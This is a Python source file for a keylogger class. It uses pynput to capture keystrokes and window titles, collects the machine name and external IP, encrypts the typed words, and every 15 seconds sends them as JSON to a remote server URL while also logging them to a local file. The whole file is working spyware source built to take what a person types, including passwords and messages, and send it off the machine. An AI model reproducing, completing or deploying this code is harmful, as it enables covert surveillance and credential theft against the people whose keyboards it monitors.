from pynput.keyboard import Listener
from logger import Logger
from window_utils import get_active_window_title
from system_info import get_system_info
from keyboard_utils import MODIFIER_KEYS
from Encryption import encryption
from keylogger_service import handle_key_press
from json_utils import build_log_json

import threading


class KeyLogger:
    def __init__(self, server_url, log_file, flush_interval=15):
        system_info = get_system_info()
        self.computer_name = system_info["computer_name"]
        self.external_ip = system_info["external_ip"]

        self.logger = Logger(log_file=log_file, server_url=server_url)

        self.current_word = ""
        self.words_buffer = []

        self.current_window_title = ""
        self.last_active_hwnd = None

        self.pressed_keys = set()
        self.stop_logging = False
        self.flush_interval = flush_interval

        self._start_flush_timer()

    def _start_flush_timer(self):
        self.flush_timer = threading.Timer(self.flush_interval, self._flush_buffer_loop)
        self.flush_timer.start()

    def _log_window_change(self, title):
        log_line = f"\n\n[Active Window: '{title}']\n"
        self.logger.write_to_file(log_line)
        print(log_line, end='')

    def update_active_window(self):
        title, hwnd = get_active_window_title()
        if hwnd != self.last_active_hwnd:
            self.last_active_hwnd = hwnd
            self.current_window_title = title
            self._log_window_change(title)

    def add_word(self, word=None):
        word = word or self.current_word
        if word:
            self.words_buffer.append(encryption(word))
            self.current_word = ""

    def flush_buffer(self, newline=False, final=False):
        if final:
            self.add_word()

        if not self.words_buffer:
            return

        json_data, timestamp, line = build_log_json(
            self.computer_name,
            self.external_ip,
            self.words_buffer,
            self.current_window_title
        )

        self.logger.send_to_server(json_data)

        log_line = f"{line}  [{timestamp}] [Window: {self.current_window_title}]\n"
        self.logger.write_to_file(log_line)

        if newline:
            print(f"  [{timestamp}]\n", end='')

        self.words_buffer = []

    def _flush_buffer_loop(self):
        if not self.stop_logging:
            self.flush_buffer()
            self._start_flush_timer()

    def on_key_press(self, key):
        return handle_key_press(key, self)

    def on_key_release(self, key):
        if key in MODIFIER_KEYS:
            self.pressed_keys.discard(key)

    def run(self):
        print("Keylogger started. Press ESC to stop.\n")
        with Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
            listener.join()

        self.stop_logging = True
        self.flush_timer.cancel()
        self.flush_buffer(final=True)
